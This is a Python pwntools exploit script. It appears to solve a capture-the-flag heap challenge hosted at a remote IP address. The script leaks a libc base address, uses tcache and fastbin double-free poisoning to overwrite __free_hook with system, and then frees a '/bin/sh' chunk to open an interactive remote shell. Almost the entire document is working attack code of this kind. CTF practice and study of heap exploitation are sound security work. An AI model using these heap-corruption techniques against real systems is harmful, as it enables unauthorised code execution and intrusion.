#coding:utf-8

from pwn import *

context(os='linux',arch='amd64')
#context.log_level = 'debug'

debug = 0
if debug:
    p = process('./chall')
else:
    p = remote('34.92.96.238',10001)
libc = ELF('./libc.so.6')

def new(length,payload,call):
	p.recvuntil('choice:')
	p.sendline('1')
	p.recvuntil('name\n')
	p.sendline(str(length))
	p.recvuntil('name:\n')
	p.send(payload)
	p.recvuntil('call:\n')
	p.send(call)

def view(index):
	p.recvuntil('choice:')
	p.sendline('2')
	p.recvuntil('index:\n')
	p.sendline(str(index))

def delete(index):
	p.recvuntil('choice:')
	p.sendline('4')
	p.recvuntil('index:\n')
	p.sendline(str(index))

new(0x4f0,'\x77'*8,'\x44'*8)    
new(0x20,'\x77'*8,'\x44'*8)
delete(0)

view(0)
p.recvuntil('name:\n')
libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0xeb3ca0-0xac8000)
log.success('libcbase = '+hex(libcbase))
#gdb.attach(p)
free_hook_addr = libcbase + libc.symbols['__free_hook']  #0x3ed8e8
log.success('free_hook_addr = '+hex(free_hook_addr))

system_addr = libcbase + libc.symbols['system']     #0x4f440
log.success('system_addr = '+hex(system_addr))
#gdb.attach(p)
new(0x20,'\x77'*8,'\x44'*8)
new(0x20,'\x77'*8,'\x44'*8)

for i in range(7):
    new(0x20,'\x77'*8,'\x44'*8)

for i in range(7):
    delete(i+4)

delete(2)
delete(3)
delete(2)

for i in range(7):
    new(0x20,'\x77'*8,'\x44'*8)

new(0x20,p64(free_hook_addr),'\x44'*8)
new(0x20,'\x77'*8,'\x44'*8)
new(0x20,'\x77'*8,'\x44'*8)
new(0x20,p64(system_addr),'\x44'*8)

new(0x20,'/bin/sh\x00','\x44'*8)

delete(22)

p.interactive()
